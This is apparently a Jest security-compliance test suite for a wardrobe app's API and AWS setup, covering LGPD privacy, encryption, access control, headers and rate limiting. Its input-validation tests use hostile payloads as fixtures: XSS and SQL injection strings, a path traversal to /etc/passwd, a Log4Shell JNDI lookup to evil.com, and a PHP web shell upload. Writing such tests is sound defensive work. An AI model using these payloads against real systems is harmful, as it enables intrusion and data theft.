import * as AWS from 'aws-sdk';
import request from 'supertest';
import { app } from '../../src/index-minimal';
import * as https from 'https';
import * as fs from 'fs';
import * as path from 'path';

describe('Security Compliance Tests', () => {
  const environment = process.env.NODE_ENV || 'staging';
  const region = process.env.AWS_REGION || 'us-east-1';
  const baseUrl = process.env.BASE_URL || 'http://localhost:3001';
  const testApp = process.env.BASE_URL ? undefined : app;

  let cloudFormation: AWS.CloudFormation;
  let ec2: AWS.EC2;
  let rds: AWS.RDS;
  let s3: AWS.S3;

  beforeAll(() => {
    AWS.config.update({ region });
    cloudFormation = new AWS.CloudFormation();
    ec2 = new AWS.EC2();
    rds = new AWS.RDS();
    s3 = new AWS.S3();
  });

  describe('LGPD Compliance', () => {
    it('should have data protection measures in place', async () => {
      const response = testApp
        ? await request(testApp).get('/health/security')
        : await request(baseUrl).get('/health/security');

      expect(response.status).toBe(200);
      expect(response.body.compliance).toMatchObject({
        lgpd: true,
        dataEncryption: true,
        auditLogging: true
      });
    });

    it('should provide data subject rights endpoints', async () => {
      // Test data access request endpoint
      const accessResponse = testApp
        ? await request(testApp).post('/api/privacy/data-access')
        : await request(baseUrl).post('/api/privacy/data-access');

      expect([400, 401, 422]).toContain(accessResponse.status); // Should require authentication

      // Test data deletion request endpoint
      const deletionResponse = testApp
        ? await request(testApp).post('/api/privacy/data-deletion')
        : await request(baseUrl).post('/api/privacy/data-deletion');

      expect([400, 401, 422]).toContain(deletionResponse.status); // Should require authentication
    });

    it('should have privacy policy endpoint', async () => {
      const response = testApp
        ? await request(testApp).get('/api/privacy/policy')
        : await request(baseUrl).get('/api/privacy/policy');

      expect([200, 404]).toContain(response.status);
      
      if (response.status === 200) {
        expect(response.body).toHaveProperty('policy');
        expect(response.body).toHaveProperty('lastUpdated');
      }
    });

    it('should log data processing activities', async () => {
      // Test that audit logging is working
      const response = testApp
        ? await request(testApp).get('/health/audit')
        : await request(baseUrl).get('/health/audit');

      expect([200, 404]).toContain(response.status);
      
      if (response.status === 200) {
        expect(response.body).toHaveProperty('auditLogging');
        expect(response.body.auditLogging).toBe(true);
      }
    });
  });

  describe('Data Encryption', () => {
    it('should encrypt data at rest in RDS', async () => {
      const databases = await rds.describeDBInstances().promise();
      const vangarmentsDbs = databases.DBInstances?.filter(db => 
        db.DBInstanceIdentifier?.includes('vangarments') && 
        db.DBInstanceIdentifier?.includes(environment)
      );

      if (vangarmentsDbs && vangarmentsDbs.length > 0) {
        vangarmentsDbs.forEach(db => {
          expect(db.StorageEncrypted).toBe(true);
        });
      }
    });

    it('should encrypt S3 buckets', async () => {
      const buckets = await s3.listBuckets().promise();
      
      const vangarmentsBuckets = buckets.Buckets?.filter(b => 
        b.Name?.includes('vangarments') && b.Name?.includes(environment)
      );

      if (vangarmentsBuckets && vangarmentsBuckets.length > 0) {
        for (const bucket of vangarmentsBuckets) {
          try {
            const encryption = await s3.getBucketEncryption({
              Bucket: bucket.Name!
            }).promise();
            
            expect(encryption.ServerSideEncryptionConfiguration).toBeDefined();
            expect(encryption.ServerSideEncryptionConfiguration.Rules).toBeDefined();
            expect(encryption.ServerSideEncryptionConfiguration.Rules!.length).toBeGreaterThan(0);
          } catch (error) {
            if (error.code !== 'ServerSideEncryptionConfigurationNotFoundError') {
              throw error;
            }
          }
        }
      }
    });

    it('should use HTTPS for data in transit', async () => {
      if (process.env.BASE_URL && process.env.BASE_URL.startsWith('https://')) {
        const url = new URL(process.env.BASE_URL);
        
        return new Promise<void>((resolve, reject) => {
          const req = https.request({
            hostname: url.hostname,
            port: 443,
            path: '/health',
            method: 'GET'
          }, (res) => {
            expect(res.statusCode).toBe(200);
            resolve();
          });

          req.on('error', (error) => {
            reject(error);
          });

          req.end();
        });
      } else {
        // For local testing, check that security headers are present
        const response = testApp
          ? await request(testApp).get('/health')
          : await request(baseUrl).get('/health');

        expect(response.headers).toHaveProperty('strict-transport-security');
      }
    });
  });

  describe('Access Control', () => {
    it('should have proper security groups configuration', async () => {
      const securityGroups = await ec2.describeSecurityGroups({
        Filters: [
          {
            Name: 'group-name',
            Values: [`*vangarments*${environment}*`]
          }
        ]
      }).promise();

      if (securityGroups.SecurityGroups && securityGroups.SecurityGroups.length > 0) {
        // Database security group should only allow access from application
        const dbSg = securityGroups.SecurityGroups.find(sg => 
          sg.GroupName?.toLowerCase().includes('database')
        );

        if (dbSg) {
          const postgresRules = dbSg.IpPermissions?.filter(rule => 
            rule.FromPort === 5432
          );

          postgresRules?.forEach(rule => {
            // Should not allow access from 0.0.0.0/0
            const hasOpenAccess = rule.IpRanges?.some(range => 
              range.CidrIp === '0.0.0.0/0'
            );
            expect(hasOpenAccess).toBeFalsy();
          });
        }

        // Redis security group should only allow access from application
        const redisSg = securityGroups.SecurityGroups.find(sg => 
          sg.GroupName?.toLowerCase().includes('redis')
        );

        if (redisSg) {
          const redisRules = redisSg.IpPermissions?.filter(rule => 
            rule.FromPort === 6379
          );

          redisRules?.forEach(rule => {
            // Should not allow access from 0.0.0.0/0
            const hasOpenAccess = rule.IpRanges?.some(range => 
              range.CidrIp === '0.0.0.0/0'
            );
            expect(hasOpenAccess).toBeFalsy();
          });
        }
      }
    });

    it('should require authentication for protected endpoints', async () => {
      const protectedEndpoints = [
        '/api/user/profile',
        '/api/wardrobe/items',
        '/api/outfits',
        '/api/marketplace/listings',
        '/api/social/posts'
      ];

      for (const endpoint of protectedEndpoints) {
        const response = testApp
          ? await request(testApp).get(endpoint)
          : await request(baseUrl).get(endpoint);

        expect([401, 403]).toContain(response.status);
      }
    });

    it('should validate JWT tokens properly', async () => {
      const invalidToken = 'invalid.jwt.token';
      
      const response = testApp
        ? await request(testApp)
            .get('/api/user/profile')
            .set('Authorization', `Bearer ${invalidToken}`)
        : await request(baseUrl)
            .get('/api/user/profile')
            .set('Authorization', `Bearer ${invalidToken}`);

      expect([401, 403]).toContain(response.status);
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should validate and sanitize user input', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '"; DROP TABLE users; --',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = testApp
          ? await request(testApp)
              .post('/api/auth/register')
              .send({
                email: maliciousInput,
                password: 'validpassword123',
                name: maliciousInput
              })
          : await request(baseUrl)
              .post('/api/auth/register')
              .send({
                email: maliciousInput,
                password: 'validpassword123',
                name: maliciousInput
              });

        expect([400, 422]).toContain(response.status);
      }
    });

    it('should prevent SQL injection', async () => {
      const sqlInjectionAttempts = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --"
      ];

      for (const injection of sqlInjectionAttempts) {
        const response = testApp
          ? await request(testApp)
              .post('/api/auth/login')
              .send({
                email: injection,
                password: 'password'
              })
          : await request(baseUrl)
              .post('/api/auth/login')
              .send({
                email: injection,
                password: 'password'
              });

        // Should return validation error, not 500 (which might indicate SQL error)
        expect([400, 401, 422]).toContain(response.status);
      }
    });

    it('should validate file uploads', async () => {
      const maliciousFile = Buffer.from('<?php system($_GET["cmd"]); ?>', 'utf8');
      
      const response = testApp
        ? await request(testApp)
            .post('/api/wardrobe/items/upload')
            .attach('image', maliciousFile, 'malicious.php')
        : await request(baseUrl)
            .post('/api/wardrobe/items/upload')
            .attach('image', maliciousFile, 'malicious.php');

      expect([400, 401, 415, 422]).toContain(response.status);
    });
  });

  describe('Security Headers', () => {
    it('should include security headers', async () => {
      const response = testApp
        ? await request(testApp).get('/health')
        : await request(baseUrl).get('/health');

      expect(response.status).toBe(200);

      // Check for security headers
      expect(response.headers).toHaveProperty('x-content-type-options', 'nosniff');
      expect(response.headers).toHaveProperty('x-frame-options');
      expect(response.headers).toHaveProperty('x-xss-protection');
      
      if (process.env.NODE_ENV === 'production') {
        expect(response.headers).toHaveProperty('strict-transport-security');
      }
    });

    it('should have Content Security Policy', async () => {
      const response = testApp
        ? await request(testApp).get('/health')
        : await request(baseUrl).get('/health');

      expect(response.status).toBe(200);
      
      // CSP header should be present in production
      if (process.env.NODE_ENV === 'production') {
        expect(response.headers).toHaveProperty('content-security-policy');
      }
    });
  });

  describe('Rate Limiting', () => {
    it('should apply rate limiting to authentication endpoints', async () => {
      const requests = Array(20).fill(null).map(() => 
        testApp
          ? request(testApp)
              .post('/api/auth/login')
              .send({ email: 'test@example.com', password: 'password' })
          : request(baseUrl)
              .post('/api/auth/login')
              .send({ email: 'test@example.com', password: 'password' })
      );

      const responses = await Promise.all(requests);
      
      // Should have some rate limited responses
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should apply rate limiting to API endpoints', async () => {
      const requests = Array(100).fill(null).map(() => 
        testApp
          ? request(testApp).get('/api/info')
          : request(baseUrl).get('/api/info')
      );

      const responses = await Promise.all(requests);
      
      // Should have some rate limited responses for high volume
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('Audit Logging', () => {
    it('should log security events', async () => {
      // Attempt failed login
      const loginResponse = testApp
        ? await request(testApp)
            .post('/api/auth/login')
            .send({ email: 'nonexistent@example.com', password: 'wrongpassword' })
        : await request(baseUrl)
            .post('/api/auth/login')
            .send({ email: 'nonexistent@example.com', password: 'wrongpassword' });

      expect([400, 401]).toContain(loginResponse.status);

      // Check if audit endpoint exists
      const auditResponse = testApp
        ? await request(testApp).get('/health/audit')
        : await request(baseUrl).get('/health/audit');

      expect([200, 404]).toContain(auditResponse.status);
    });

    it('should log data access events', async () => {
      // This would typically check CloudWatch logs or audit database
      // For now, we verify the audit system is configured
      const response = testApp
        ? await request(testApp).get('/health/security')
        : await request(baseUrl).get('/health/security');

      expect(response.status).toBe(200);
      expect(response.body.compliance.auditLogging).toBe(true);
    });
  });

  describe('Secrets Management', () => {
    it('should not expose sensitive information in responses', async () => {
      const response = testApp
        ? await request(testApp).get('/api/info')
        : await request(baseUrl).get('/api/info');

      expect(response.status).toBe(200);
      
      const responseText = JSON.stringify(response.body);
      
      // Should not contain sensitive patterns
      expect(responseText).not.toMatch(/password/i);
      expect(responseText).not.toMatch(/secret/i);
      expect(responseText).not.toMatch(/key/i);
      expect(responseText).not.toMatch(/token/i);
      expect(responseText).not.toMatch(/aws_access_key/i);
      expect(responseText).not.toMatch(/database_url/i);
    });

    it('should not expose environment variables', async () => {
      const response = testApp
        ? await request(testApp).get('/health')
        : await request(baseUrl).get('/health');

      expect(response.status).toBe(200);
      
      const responseText = JSON.stringify(response.body);
      
      // Should not expose sensitive env vars
      expect(responseText).not.toMatch(/DATABASE_URL/);
      expect(responseText).not.toMatch(/JWT_SECRET/);
      expect(responseText).not.toMatch(/AWS_ACCESS_KEY/);
      expect(responseText).not.toMatch(/AWS_SECRET_KEY/);
    });
  });

  describe('Vulnerability Scanning', () => {
    it('should not have known vulnerable dependencies', () => {
      const packageJsonPath = path.join(__dirname, '../../package.json');
      expect(fs.existsSync(packageJsonPath)).toBe(true);
      
      const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf8'));
      
      // Check for known vulnerable packages (this is a basic check)
      const dependencies = { ...packageJson.dependencies, ...packageJson.devDependencies };
      
      // Examples of packages that should be avoided or updated
      const vulnerablePackages = [
        'lodash@4.17.15', // Example of vulnerable version
        'moment@2.29.1',  // Example of vulnerable version
      ];

      vulnerablePackages.forEach(vulnPackage => {
        const [name, version] = vulnPackage.split('@');
        if (dependencies[name]) {
          expect(dependencies[name]).not.toBe(version);
        }
      });
    });

    it('should have security middleware configured', async () => {
      const response = testApp
        ? await request(testApp).get('/health/security')
        : await request(baseUrl).get('/health/security');

      expect(response.status).toBe(200);
      expect(response.body.security).toMatchObject({
        helmet: true,
        cors: true,
        rateLimiting: true,
        authentication: true
      });
    });
  });

  describe('Data Privacy', () => {
    it('should handle personal data according to LGPD', async () => {
      // Test data minimization - only collect necessary data
      const registrationResponse = testApp
        ? await request(testApp)
            .post('/api/auth/register')
            .send({
              email: 'test@example.com',
              password: 'validpassword123',
              name: 'Test User',
              cpf: '12345678901'
            })
        : await request(baseUrl)
            .post('/api/auth/register')
            .send({
              email: 'test@example.com',
              password: 'validpassword123',
              name: 'Test User',
              cpf: '12345678901'
            });

      // Should validate CPF format for Brazilian users
      expect([400, 422]).toContain(registrationResponse.status);
    });

    it('should provide data portability', async () => {
      // Test data export functionality
      const exportResponse = testApp
        ? await request(testApp).get('/api/privacy/export')
        : await request(baseUrl).get('/api/privacy/export');

      expect([401, 404]).toContain(exportResponse.status); // Should require authentication
    });

    it('should allow data deletion', async () => {
      // Test right to be forgotten
      const deleteResponse = testApp
        ? await request(testApp).delete('/api/privacy/delete-account')
        : await request(baseUrl).delete('/api/privacy/delete-account');

      expect([401, 404]).toContain(deleteResponse.status); // Should require authentication
    });
  });
});